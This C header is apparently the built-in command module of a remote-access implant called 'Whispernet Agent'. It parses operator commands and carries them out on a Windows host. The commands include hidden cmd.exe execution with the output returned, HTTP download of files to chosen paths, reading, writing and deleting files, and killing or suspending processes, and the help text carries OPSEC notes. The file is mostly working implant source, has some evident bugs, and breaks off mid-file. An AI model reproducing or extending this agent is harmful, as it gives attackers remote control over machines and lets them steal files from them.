#pragma once

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h> // For WhisperCreateToolhelp32Snapshot, Process32First, Process32Next
#include "type_conversions.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"

//function command related items


/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);

void get_username(OutboundJsonDataStruct* response_struct);
int parse_command(char* command, char* args, OutboundJsonDataStruct*);
void shell(OutboundJsonDataStruct*, char* args);
void get_file_http(OutboundJsonDataStruct*, char* args);
void messagebox(OutboundJsonDataStruct*, char* args);
void sleep(OutboundJsonDataStruct*, char* args);
void help(OutboundJsonDataStruct*);

//filesystem stuff
void mkdir(OutboundJsonDataStruct* response_struct, char* args);
void rmdir(OutboundJsonDataStruct* response_struct, char* args);
void cd(OutboundJsonDataStruct* response_struct, char* args);
void pwd(OutboundJsonDataStruct* response_struct);

//file ops
void write_file(OutboundJsonDataStruct* response_struct, char* args);
void read_file(OutboundJsonDataStruct* response_struct, char* args);
void delete_file(OutboundJsonDataStruct* response_struct, char* args);
void append_file(OutboundJsonDataStruct* response_struct, char* args);
void rename_file(OutboundJsonDataStruct* response_struct, char* args);
void copy_file(OutboundJsonDataStruct* response_struct, char* args);
void ls(OutboundJsonDataStruct* response_struct, char* args);

//process stuff
void start_process(OutboundJsonDataStruct* response_struct, char* args);
void kill_process(OutboundJsonDataStruct* response_struct, char* args);
void suspend_process(OutboundJsonDataStruct* response_struct, char* args);
void resume_process(OutboundJsonDataStruct* response_struct, char* args);
void list_processes(OutboundJsonDataStruct* response_struct);

// ====================
// Functions
// ====================

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...

int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct) {
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1;
    }

    DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);

    if (strcmp(command, "whoami") == 0) {
        DEBUG_LOG("[COMMAND] whoami\n");
        get_username(response_struct);
    } else if (strcmp(command, "shell") == 0) {
        DEBUG_LOG("[COMMAND] shell\n");
        shell(response_struct, args);
    } else if (strcmp(command, "http_get") == 0) {
        DEBUG_LOG("[COMMAND] http_get...\n");
        get_file_http(response_struct, args);
    } else if (strcmp(command, "messagebox") == 0) {
        DEBUG_LOG("[COMMAND] messagebox...\n");
        messagebox(response_struct, args);
    } else if (strcmp(command, "help") == 0) {
        DEBUG_LOG("[COMMAND] help...\n");
        help(response_struct);
    } else if (strcmp(command, "sleep") == 0) {
        DEBUG_LOG("[COMMAND] sleep\n");
        sleep(response_struct, args);
    } else if (strcmp(command, "mkdir") == 0) {
        DEBUG_LOG("[COMMAND] mkdir\n");
        mkdir(response_struct, args);
    } else if (strcmp(command, "cd") == 0) {
        DEBUG_LOG("[COMMAND] cd\n");
        cd(response_struct, args);
    } else if (strcmp(command, "rmdir") == 0) {
        DEBUG_LOG("[COMMAND] rmdir\n");
        rmdir(response_struct, args);
    } else if (strcmp(command, "pwd") == 0) {
        DEBUG_LOG("[COMMAND] pwd\n");
        pwd(response_struct);
    } else if (strcmp(command, "write_file") == 0) {
        DEBUG_LOG("[COMMAND] write_file\n");
        write_file(response_struct, args);
    } else if (strcmp(command, "read_file") == 0) {
        DEBUG_LOG("[COMMAND] read_file\n");
        read_file(response_struct, args);
    } else if (strcmp(command, "delete_file") == 0) {
        DEBUG_LOG("[COMMAND] delete_file\n");
        delete_file(response_struct, args);
    } else if (strcmp(command, "append_file") == 0) {
        DEBUG_LOG("[COMMAND] append_file\n");
        append_file(response_struct, args);
    } else if (strcmp(command, "rename_file") == 0) {
        DEBUG_LOG("[COMMAND] rename_file\n");
        rename_file(response_struct, args);
    } else if (strcmp(command, "copy_file") == 0) {
        DEBUG_LOG("[COMMAND] copy_file\n");
        copy_file(response_struct, args);
    } else if (strcmp(command, "ls") == 0) {
        DEBUG_LOG("[COMMAND] ls\n");
        ls(response_struct, args);
    } else if (strcmp(command, "start_process") == 0) {
        DEBUG_LOG("[COMMAND] start_process\n");
        start_process(response_struct, args);
    } else if (strcmp(command, "kill_process") == 0) {
        DEBUG_LOG("[COMMAND] kill_process\n");
        kill_process(response_struct, args);
    } else if (strcmp(command, "suspend_process") == 0) {
        DEBUG_LOG("[COMMAND] suspend_process\n");
        suspend_process(response_struct, args);
    } else if (strcmp(command, "resume_process") == 0) {
        DEBUG_LOG("[COMMAND] resume_process\n");
        resume_process(response_struct, args);
    } else if (strcmp(command, "list_process")) {
        DEBUG_LOG("[COMMAND] list_process\n");
        list_processes(response_struct);
    }   else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        set_response_data(response_struct, "Unknown command");
    }
    return 0;
}

// ====================
// Helper funcs
// ====================

/**
 * @brief Allocates and sets the command_result_data field in the response struct.
 *
 * This function dynamically allocates memory and copies the given string (`data`)
 * into the `command_result_data` field of `response_struct`. If memory was already
 * allocated for `command_result_data`, it is freed before assigning the new value.
 *
 * @param response_struct Pointer to the OutboundJsonDataStruct where data should be stored.
 * @param data The string to be copied into response_struct->command_result_data.
 *
 * @note The caller is responsible for ensuring response_struct is a valid, allocated pointer.
 * @note The caller must free response_struct->command_result_data before deallocating response_struct.
 * @note This function uses `_strdup`, which internally calls `malloc`. If memory allocation fails,
 *       `command_result_data` remains NULL and a debug log is printed.
 *
 * @example
 * ```c
 * OutboundJsonDataStruct* response = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
 * if (!response) {
 *     printf("Memory allocation failed for response_struct.\n");
 *     return 1;
 * }
 * 
 * set_response_data(response, "Operation successful");
 * printf("Response: %s\n", response->command_result_data);
 * 
 * // Cleanup
 * free(response->command_result_data);
 * free(response);
 * ```
 */
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data) {
    if (response_struct->command_result_data) {
        free(response_struct->command_result_data);
    }
    
    response_struct->command_result_data = _strdup(data); // _strdup dynamically allocates and copies the string
    if (!response_struct->command_result_data) {
        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
    }
}


// ====================
// Commands
// ====================

void get_username(OutboundJsonDataStruct* response_struct) {
    /*
        Retrieves the current user's name.

        Uses the WhisperGetUserNameW wrapper function.  Converts the
        retrieved username from WCHAR (wide characters) to UTF-8 for
        compatibility with the JSON response.
    */
    WCHAR username[256];
    DWORD size = 256;

    if (WhisperGetUserNameW(username, &size)) {
        DEBUG_LOGW(L"Current User: %s\n", username);

        char* utf8_username = wchar_to_utf8(username);
        if (utf8_username) {
            free(response_struct->command_result_data); // Free previous data
            set_response_data(response_struct, utf8_username);
            free(utf8_username); // Free allocated UTF-8 string to prevent memory leak
        } else {
            DEBUG_LOG("wchar_to_utf8 failed.\n");
            set_response_data(response_struct, "Error converting username to UTF-8");
        }
    } else {
        DWORD error = GetLastError();
        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}


void shell(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Executes a shell command using cmd.exe.

        This function creates a child process running cmd.exe with the given
        command.  It captures the output of the command via pipes and sends it
        back to the client. 
    */

    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer[PIPE_READ_SIZE_BUFFER]; // More descriptive name
    DWORD bytesRead;
    BOOL success;

    // Security attributes for pipe handles
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipe
    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
        DWORD error = GetLastError();
        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return; // Important: Return on error
    }
    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Create child process
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.dwFlags |= CREATE_NO_WINDOW; // Hides the console window

    char cmdLine[CLI_INPUT_SIZE_BUFFER];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);

    ZeroMemory(&pi, sizeof(pi));
    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, PROCESS_SPAWN_DIRECTORY, &si, &pi);

    if (!success) {
        DWORD error = GetLastError();
        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);

        WhisperCloseHandle(hWrite);
        WhisperCloseHandle(hRead);
        return; // Important: Return on error
    }

    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
    WhisperCloseHandle(hWrite);

    // Read pipe
    char output_buffer[PIPE_READ_SIZE_BUFFER] = ""; // Initialize an empty string
    DWORD totalBytesRead = 0;

    while (TRUE) {
        success = WhisperReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        if (!success || bytesRead == 0) {
            break;
        }

        buffer[bytesRead] = '\0';
        DEBUG_LOG("%s", buffer);

        // Append to the output buffer (handle potential buffer overflow)
        size_t available = sizeof(output_buffer) - strlen(output_buffer) - 1;
        size_t to_copy = min(available, (size_t)bytesRead); // Safe copy
        strncat(output_buffer, buffer, to_copy);
        totalBytesRead += bytesRead;
    }

    // Generate response
    free(response_struct->command_result_data);
    set_response_data(response_struct, output_buffer); // Send accumulated output

    // Cleanup
    WhisperCloseHandle(pi.hProcess);
    WhisperCloseHandle(pi.hThread);
    WhisperCloseHandle(hRead);
}


void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Displays a message box.

        Takes a title and a message as arguments.  Uses the WhisperMessageBoxA
        wrapper function to display the message box.
    */
    char* context = NULL;
    char* title = strtok_s(args, " ", &context);
    char* message = strtok_s(NULL, " ", &context);

    if (!title || !message) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <title> <message>\n");
        set_response_data(response_struct, "Invalid arguments. Expected: <title> <message>");
        return;
    }

    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
    set_response_data(response_struct, "Message box displayed successfully");
}

void get_file_http(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* url = strtok_s(args, " ", &context);
    char* file_path = strtok_s(NULL, " ", &context);

    if (!url || !file_path) {
        DEBUG_LOG("[ERROR] get_file_http: Expected: <URL> <FilePath>\n");
        set_response_data(response_struct, "Invalid arguments. Expected: <URL> <FilePath>");
        return;
    }

    DEBUG_LOG("URL: %s\n", url);
    DEBUG_LOG("File Path: %s\n", file_path);

    int result = download_file(url, file_path);

    if (result == 0) {
        set_response_data(response_struct, "File downloaded successfully");
    } else {
        // Retrieve the formatted error message from download_file (if available)
        char error_message[512] = "File download failed: ";

        // It is better to have download_file return the actual error message
        // instead of just an error code. Then you can do:
        // strncat(error_message, returned_error_message, sizeof(error_message) - strlen(error_message) - 1);

        // For now, if download_file doesn't return the message, we'll have to rely on a generic one
        if (strlen(error_message) <= 20) { // Check if it's still the base message
            strncat(error_message, "Check the logs for more details.", sizeof(error_message) - strlen(error_message) - 1);
        }

        set_response_data(response_struct, error_message);
    }
}


// Keep
void sleep(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Sets the sleep time for the agent.

        Takes an integer argument representing the sleep time in seconds.
        Uses strtol for safer integer parsing.
    */
    char* context = NULL;
    char* sleep_arg = strtok_s(args, " ", &context);

    if (!sleep_arg) {
        DEBUG_LOG("[ERROR] sleep: Expected: <int: sleeptime (seconds)>\n");
        set_response_data(response_struct, "Missing sleep time argument");
        return;
    }

    char* endptr; // For error checking with strtol
    long sleep_seconds = strtol(sleep_arg, &endptr, 10); // Parse as long int

    // Error checking for strtol
    if (*endptr != '\0' || sleep_seconds < 0) { // Check for non-numeric input and negative values
        DEBUG_LOG("[ERROR] sleep: Invalid sleep time. Must be a non-negative integer.\n");
        set_response_data(response_struct, "Invalid sleep time. Must be a non-negative integer.");
        return;
    }

    // Convert to DWORD (handle potential overflow)
    DWORD dwTime;
    if (sleep_seconds > MAXDWORD / 1000) { // Check for potential overflow if time is in seconds
        DEBUG_LOG("[ERROR] sleep: Sleep time too large.\n");
        set_response_data(response_struct, "Sleep time too large.");
        return;
    }
    dwTime = (DWORD)(sleep_seconds * 1000); // Convert to milliseconds

    set_sleep_time(dwTime);
    char message[256];
    snprintf(message, sizeof(message), "Sleep time set to %ld seconds", sleep_seconds); //response message
    set_response_data(response_struct, message);
    return;
}

// Keep
void help(OutboundJsonDataStruct* response_struct) {
    const char* help_string = "Help:\n\n\
**Command Execution:**\n\
    `shell`: (shell <str: command>) - Runs a command via cmd.exe.\n\
        *OPSEC: Runs a new cmd.exe process*\n\n\
**Transfer Commands:**\n\
    `http_get`: (http_get <str: url> <str: filepath>) - Downloads an HTTP file.\n\n\
**File Commands:**\n\
    `write_file`: (write_file <str: path> <str: contents>) - Writes contents to a file.\n\
    `read_file`: (read_file <str: path>) - Reads contents of a file.\n\
    `delete_file`: (delete_file <str: path>) - Deletes a file.\n\
    `append_file`: (append_file <str: path> <str: contents>) - Appends data to an existing file.\n\
    `rename_file`: (rename_file <str: old_path> <str: new_path>) - Renames or moves a file.\n\
    `copy_file`: (copy_file <str: src> <str: dest>) - Copies a file from one location to another.\n\n\
**Directory Commands:**\n\
    `mkdir`: (mkdir <str: directory>) - Creates a new directory.\n\
    `rmdir`: (rmdir <str: directory>) - Removes a directory.\n\
    `cd`: (cd <str: directory>) - Changes the current directory.\n\
    `pwd`: (pwd) - Prints the current working directory.\n\
    `ls`: [BROKEN DO NOT RUN, will crash] (ls <str: path (optional)>) - Lists files and directories in the specified path (or current directory if none provided).\n\n\
**Process Commands:**\n\
    `start_process`: (start_process <str: command>) - Starts a new process.\n\
    `kill_process`: (kill_process <int: PID>) - Kills a process by PID.\n\
    `suspend_process`: (suspend_process <int: PID>) - Suspends a process.\n\
    `resume_process`: (resume_process <int: PID>) - Resumes a suspended process.\n\
    `list_processes`: - Lists all running processes.\n\
        Warning: Buffer size of 8192, not all processes may show up if many are running.\n\n\
**User Interaction:**\n\
    `messagebox`: (messagebox <str: title> <str: message>) - Displays a message box on screen.\n\n\
**Config Commands:**\n\
    `sleep`: (sleep <int: sleeptime (seconds)>) - Sets the sleep time.\n\n\
";

    set_response_data(response_struct, help_string);
}

/*
Directory Commands

Need to switch to WhisperFunctions

Still need some work

*/



/* 
    Create a directory 
*/
void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

    if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (WhisperCreateDirectoryA(path_arg, NULL)) {
        DEBUG_LOG("Directory created: %s\n", path_arg);
        set_response_data(response_struct, "Directory created");
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Remove a directory 
*/
void rmdir(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

    if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (WhisperRemoveDirectoryA(path_arg)) {
        DEBUG_LOG("Directory removed: %s\n", path_arg);
        set_response_data(response_struct, "Directory removed");
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Change directory 
*/
void cd(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

     if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (WhisperSetCurrentDirectoryA(path_arg)) {
        DEBUG_LOG("Changed directory to: %s\n", path_arg);
        char cwd[MAX_PATH];
        WhisperGetCurrentDirectoryA(MAX_PATH, cwd); // Get the actual current directory
        set_response_data(response_struct, cwd); // Respond with the full current directory
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Get current working directory 
*/
void pwd(OutboundJsonDataStruct* response_struct) {
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        DEBUG_LOG("Current working directory: %s\n", cwd);
        set_response_data(response_struct, cwd);
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", error);
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

// ============
// File OPs
// ============
// [ ] Whisper Convert
void write_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path = strtok_s(args, " ", &context);
    char* contents = strtok_s(NULL, "", &context);

    if (!path || !contents) {
        set_response_data(response_struct, "Invalid arguments. Expected: <path> <contents>");
        return;
    }

    HANDLE hFile = WhisperCreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    DWORD bytesWritten;
    if (WhisperWriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
        set_response_data(response_struct, "File written successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    WhisperCloseHandle(hFile);
}
// [ ] Whisper Convert
void read_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path = strtok_s(args, " ", &context);

    if (!path) {
        set_response_data(response_struct, "Invalid arguments. Expected: <path>");
        return;
    }

    HANDLE hFile = WhisperCreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        WhisperCloseHandle(hFile);
        return;
    }

    char* contents = (char*)malloc(fileSize + 1);
    if (!contents) {
        set_response_data(response_struct, "Memory allocation failed");
        WhisperCloseHandle(hFile);
        return;
    }

    DWORD bytesRead;
    if (WhisperReadFile(hFile, contents, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
        contents[fileSize] = '\0';
        set_response_data(response_struct, contents);
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    free(contents);
    WhisperCloseHandle(hFile);
}
// [ ] Whisper Convert
void delete_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path = strtok_s(args, " ", &context);

    if (!path) {
        set_response_data(response_struct, "Invalid arguments. Expected: <path>");
        return;
    }

    if (WhisperDeleteFileA(path)) {
        set_response_data(response_struct, "File deleted successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}
// [ ] Whisper Convert
void append_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path = strtok_s(args, " ", &context);
    char* contents = strtok_s(NULL, "", &context);

    if (!path || !contents) {
        set_response_data(response_struct, "Invalid arguments. Expected: <path> <contents>");
        return;
    }

    HANDLE hFile = WhisperCreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    SetFilePointer(hFile, 0, NULL, FILE_END); // Seek to the end

    DWORD bytesWritten;
    if (WhisperWriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
        set_response_data(response_struct, "Data appended to file successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    WhisperCloseHandle(hFile);
}
// [ ] Whisper Convert
void rename_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* old_path = strtok_s(args, " ", &context);
    char* new_path = strtok_s(NULL, " ", &context);

    if (!old_path || !new_path) {
        set_response_data(response_struct, "Invalid arguments. Expected: <old_path> <new_path>");
        return;
    }

    if (WhisperMoveFileA(old_path, new_path)) {
        set_response_data(response_struct, "File renamed/moved successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}
// [ ] Whisper Convert
void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* src = strtok_s(args, " ", &context);
    char* dest = strtok_s(NULL, " ", &context);

    if (!src || !dest) {
        set_response_data(response_struct, "Invalid arguments. Expected: <src> <dest>");
        return;
    }

    if (WhisperCopyFileA(src, dest, FALSE)) {
        set_response_data(response_struct, "File copied successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}
// [ ] Whisper Convert
void ls(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path = strtok_s(args, " ", &context);

    if (!path) {
        // Use current directory if path is not provided
        path = "."; // Or get the current directory using GetCurrentDirectory
    }


    WIN32_FIND_DATAW wfd; // Unicode find data structure
    HANDLE hFind = INVALID_HANDLE_VALUE;

    // Prepare the string for use with FindFirstFileW.  Need to convert to wide char
    wchar_t wPath[MAX_PATH];
    mbstowcs(wPath, path, MAX_PATH); // Convert from char* to wchar_t*

    wchar_t searchPath[MAX_PATH];
    swprintf(searchPath, MAX_PATH, L"%s\\*", wPath); // Add the wildcard

    hFind = WhisperFindFirstFileW(searchPath, &wfd);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    char fileList[8192] = ""; // Buffer to store the list of files (adjust size as needed)
    char tempFileName[MAX_PATH];

    do {
        // Convert back to char* for concatenation
        wcstombs(tempFileName, wfd.cFileName, MAX_PATH);  // Convert wide char to multibyte

        strcat(fileList, tempFileName);
        strcat(fileList, "\n"); // toss in a newline after appending each item
    } while (WhisperFindNextFileW(hFind, &wfd) != 0);

    WhisperFindClose(hFind);

    if (strlen(fileList) == 0) {
        set_response_data(response_struct, "No files found.");
    } else {
      set_response_data(response_struct, fileList);
    }
}

// ============
// Process Ops
// ============

// [ ] Whisper Convert
void start_process(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* command = strtok_s(args, " ", &context);

    if (!command) {
        set_response_data(response_struct, "Invalid arguments. Expected: <command>");
        return;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (WhisperCreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DEBUG_LOG("Process started successfully. PID: %lu\n", pi.dwProcessId);
        char message[256];
        snprintf(message, sizeof(message), "Process started successfully. PID: %lu", pi.dwProcessId);
        set_response_data(response_struct, message);

        WhisperCloseHandle(pi.hProcess);
        WhisperCloseHandle(pi.hThread);
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}

// [ ] Whisper Convert
void kill_process(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* pid_str = strtok_s(args, " ", &context);

    if (!pid_str) {
        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
        return;
    }

    DWORD pid = strtoul(pid_str, NULL, 10); // Convert PID string to unsigned long

    HANDLE hProcess = WhisperOpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    if (WhisperTerminateProcess(hProcess, 1)) { // 1 is the exit code
        set_response_data(response_struct, "Process terminated successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    WhisperCloseHandle(hProcess);
}

// [ ] Whisper Convert
void suspend_process(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* pid_str = strtok_s(args, " ", &context);

    if (!pid_str) {
        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
        return;
    }

    DWORD pid = strtoul(pid_str, NULL, 10);

    HANDLE hProcess = WhisperOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (hProcess == NULL) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    if (WhisperSuspendThread(hProcess) != (DWORD)-1) { // Suspend the main thread
        set_response_data(response_struct, "Process suspended successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    WhisperCloseHandle(hProcess);
}

// [ ] Whisper Convert
